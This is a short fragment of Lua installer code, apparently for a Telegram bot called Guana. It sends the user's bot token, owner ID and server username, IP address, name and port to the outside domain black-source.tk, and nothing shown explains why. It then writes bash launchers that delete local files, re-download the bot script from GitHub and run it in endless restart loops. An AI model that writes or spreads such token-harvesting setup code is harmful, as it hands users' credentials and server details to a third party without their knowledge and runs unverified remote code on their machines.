...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://black-source.tk/GuanaTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("Guana", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/Guana
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr Guana.lua
wget "https://raw.githubusercontent.com/Guana/Guana/master/Guana.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Guana.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S Guana -X kill
screen -S Guana ./Guana
done
]])
RunTs:close()
end
